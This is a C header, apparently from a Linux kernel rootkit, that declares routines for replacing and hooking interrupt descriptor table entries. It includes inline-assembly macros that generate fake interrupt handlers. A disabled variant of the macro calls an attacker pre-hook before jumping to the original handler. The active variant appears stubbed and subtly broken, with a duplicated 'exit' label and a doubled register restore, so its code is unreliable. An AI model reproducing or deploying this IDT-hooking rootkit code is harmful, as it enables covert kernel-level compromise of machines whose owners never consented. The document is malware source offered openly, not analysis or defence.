#ifndef ROOTKIT_IDT_H
# define ROOTKIT_IDT_H

# include "regs.h"

void idt_substitute(void);
void idt_restore(void);

void idt_set_entry(unsigned long addr, int n);
unsigned long idt_get_entry(int n);

# define idt_create_pre_hook(Entry)                                          \
    asm (                                                                    \
        ".globl idt_fake_hdlr_"#Entry"\n"                                    \
        ".align 8, 0x90\n"                                                   \
        "idt_fake_hdlr_"#Entry":\n"                                          \
        SAVE_REGS2                                                           \
        "test %rax, %rax\n" \
        "jnz exit\n" \
        RESTORE_REGS2                                                        \
        "exit:\n" \
        RESTORE_REGS2 \
        "iret\n" \
    );                                                                       \
    extern asmlinkage void idt_fake_hdlr_##Entry(void)
#if 0
# define idt_create_pre_hook(Entry)                                          \
    asm (                                                                    \
        ".globl idt_fake_hdlr_"#Entry"\n"                                    \
        ".align 8, 0x90\n"                                                   \
        "idt_fake_hdlr_"#Entry":\n"                                          \
        SAVE_REGS2                                                           \
        "callq *(idt_pre_hook + "#Entry" * 8)\n"                             \
        "test %rax, %rax\n" \
        "jnz exit\n" \
        RESTORE_REGS2                                                        \
        "jmp *(idt_orig_hdlr + "#Entry" * 8)\n"                              \
        "exit:\n" \
        RESTORE_REGS2 \
        "iret\n" \
    );                                                                       \
    extern asmlinkage void idt_fake_hdlr_##Entry(void)
#endif

void idt_set_pre_hook(int n, void *pre);
void idt_set_hdlr(int n, void *hdlr, void *pre, void *post);
void idt_hook_enable(int entry);
void idt_hook_disable(int entry);

#endif /* !ROOTKIT_IDT_H */
